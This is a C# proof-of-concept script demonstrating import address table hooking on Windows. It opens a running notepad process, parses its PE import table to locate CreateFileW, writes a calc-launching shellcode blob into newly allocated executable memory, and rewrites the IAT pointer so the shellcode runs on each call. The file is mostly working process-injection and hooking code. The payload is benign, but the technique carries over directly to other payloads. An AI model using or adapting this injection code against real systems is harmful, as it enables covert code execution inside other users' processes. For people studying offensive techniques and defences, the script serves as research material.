/*
A script to demonstrate IAT hooking created by @pwndizzle.

Parts of the PE parsing code was originally created by Casey Smith.

To build and run:

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe iat-inject.cs && iat-inject.exe

Note: During test it was found that shellcode execution would modify the stack and break subsequent functions.
Afaik the solution is to use shellcode that cleans up after itself.

*/

using System;
using System.IO;
using System.Text;
using System.IO.Compression;
using System.EnterpriseServices;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Diagnostics;


namespace Delivery
{

    public class Program
    {
		
		public static void Main()
        {
			string targetProcName = "notepad";
			string targetFuncName = "CreateFileW";
			
			// Get target process id and read memory contents
			Process process = Process.GetProcessesByName(targetProcName)[0];
			IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process.Id);
			int bytesRead = 0;
			byte[] fileBytes = new byte[process.WorkingSet64];
			ReadProcessMemory(hProcess, process.MainModule.BaseAddress, fileBytes, fileBytes.Length, ref bytesRead);
			
			// The DOS header
			IMAGE_DOS_HEADER dosHeader;

			// The file header
			IMAGE_FILE_HEADER fileHeader;

			// Optional 32 bit file header 
			IMAGE_OPTIONAL_HEADER32 optionalHeader32 = new IMAGE_OPTIONAL_HEADER32();

			// Optional 64 bit file header 
			IMAGE_OPTIONAL_HEADER64 optionalHeader64 = new IMAGE_OPTIONAL_HEADER64();

			// Image Section headers
			IMAGE_SECTION_HEADER[] imageSectionHeaders;
			
			// Import descriptor for each DLL
			IMAGE_IMPORT_DESCRIPTOR[] importDescriptors;
			
			// Convert file bytes to memorystream and use reader
			MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length);
			BinaryReader reader = new BinaryReader(stream);
			
			//Begin parsing structures
			dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

			// Add 4 bytes to the offset
			stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

			UInt32 ntHeadersSignature = reader.ReadUInt32();
			fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
			if (Is32BitHeader(fileHeader))
			{
				optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
			}
			else
			{
				optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
			}

			imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
			for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
			{
				imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
			}
			
			// Go to ImportTable and parse every imported DLL
			stream.Seek((long)((ulong)optionalHeader64.ImportTable.VirtualAddress), SeekOrigin.Begin);
			importDescriptors = new IMAGE_IMPORT_DESCRIPTOR[50];
			
			for (int i = 0; i < 50; i++)
			{
				importDescriptors[i] = FromBinaryReader<IMAGE_IMPORT_DESCRIPTOR>(reader);
			}
			bool flag = false;
			int j = 0;
			
			// The below is really hacky, would have been better to use structures!
			while (j < importDescriptors.Length && !flag)
			{
				for (int k = 0; k < 1000; k++)
				{
					// Get the address for the function and its name
					Console.WriteLine("##############################");
					stream.Seek(importDescriptors[j].OriginalFirstThunk + (k * 8), SeekOrigin.Begin);
					
					long nameOffset = reader.ReadInt64();
					if (nameOffset > 1000000 || nameOffset < 0)
					{
						break;
					}

					// Get the function name
					stream.Seek(nameOffset + 2, SeekOrigin.Begin);
					List<string> list = new List<string>();
					byte[] array;
					do
					{
						array = reader.ReadBytes(1);
						list.Add(Encoding.Default.GetString(array));
					}
					while (array[0] != 0);
					string curFuncName = string.Join(string.Empty, list.ToArray());
					curFuncName = curFuncName.Substring(0, curFuncName.Length - 1);
					
					// Get the offset of the pointer to the target function and its current value
					long funcOffset = importDescriptors[j].FirstThunk + (k * 8);
					stream.Seek(funcOffset, SeekOrigin.Begin);
					long curFuncAddr = reader.ReadInt64();
					Console.WriteLine("funcname: " + curFuncName + "  ptr: " + curFuncAddr.ToString("X"));
					
					// Found target function, modify address to point to shellcode
					if (curFuncName == targetFuncName)
					{

						// WinExec shellcode from: https://github.com/peterferrie/win-exec-calc-shellcode
						// nasm w64-exec-calc-shellcode.asm -DSTACK_ALIGN=TRUE -DFUNC=TRUE -DCLEAN=TRUE -o w64-exec-calc-shellcode.bin
						byte[] payload = new byte[111] {
						0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58
						};

						// Once shellcode has executed go to real import (mov to rax then jmp to address)
						byte[] mov_rax = new byte[2] {
							0x48, 0xb8
						};
						byte[] jmp_address = BitConverter.GetBytes(curFuncAddr); 
						byte[] jmp_rax = new byte[2] {
							0xff, 0xe0
						};
						
						// Build shellcode
						byte[] shellcode = new byte[payload.Length + mov_rax.Length + jmp_address.Length + jmp_rax.Length];
						payload.CopyTo(shellcode, 0);
						mov_rax.CopyTo(shellcode, payload.Length);
						jmp_address.CopyTo(shellcode, payload.Length+mov_rax.Length);
						jmp_rax.CopyTo(shellcode, payload.Length+mov_rax.Length+jmp_address.Length);
						
						// Allocate memory for shellcode
						IntPtr shellcodeAddress = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						
						// Write shellcode to memory
						IntPtr shellcodeBytesWritten = IntPtr.Zero;
						WriteProcessMemory(hProcess,shellcodeAddress,shellcode,shellcode.Length, out shellcodeBytesWritten);
						
						long funcAddress = (long)optionalHeader64.ImageBase + funcOffset;

						// Get current value of IAT
						bytesRead = 0;
						byte[] buffer1 = new byte[8];
						ReadProcessMemory(hProcess, (IntPtr)funcAddress, buffer1, buffer1.Length, ref bytesRead);
						
						// Get shellcode address
						byte[] shellcodePtr = BitConverter.GetBytes((Int64)shellcodeAddress);
						
						// Modify permissions to allow IAT modification
						uint oldProtect = 0;
						bool protectbool = VirtualProtectEx(hProcess, (IntPtr)funcAddress, shellcodePtr.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
						
						// Modfiy IAT to point to shellcode
						IntPtr iatBytesWritten = IntPtr.Zero;
						bool success = WriteProcessMemory(hProcess, (IntPtr)funcAddress, shellcodePtr, shellcodePtr.Length, out iatBytesWritten);
						
						// Read IAT to confirm new value
						bytesRead = 0;
						byte[] buffer = new byte[8];
						ReadProcessMemory(hProcess, (IntPtr)funcAddress, buffer, buffer.Length, ref bytesRead);
						Console.WriteLine("Old IAT ptr: " + BitConverter.ToString(buffer1) + "  New IAT ptr: " + BitConverter.ToString(buffer));
						
						flag = true;
						break;
					}
				}
				j++;
			}
        }
		
		
		public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }
		
		[StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }
		
		[StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {

            Stub = 0x00000000,

        }
		
		public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }


        public static bool Is32BitHeader(IMAGE_FILE_HEADER fileHeader)
        {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & fileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
		
		
		// Process privileges
		public const int PROCESS_CREATE_THREAD = 0x0002;
		public const int PROCESS_QUERY_INFORMATION = 0x0400;
		public const int PROCESS_VM_OPERATION = 0x0008;
		public const int PROCESS_VM_WRITE = 0x0020;
		public const int PROCESS_VM_READ = 0x0010;
		public const int PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
		
		// Memory permissions
		public const uint MEM_COMMIT = 0x00001000;
		public const uint MEM_RESERVE = 0x00002000;
		public const uint PAGE_READWRITE = 0x04;
		public const uint PAGE_EXECUTE_READWRITE = 0x40;

		
		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
		
		[DllImport("kernel32.dll")]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
		
		[DllImport("kernel32.dll")]
		public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll")]
		public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
	
		[DllImport("kernel32.dll")]
		public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
	
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		
    } 
}
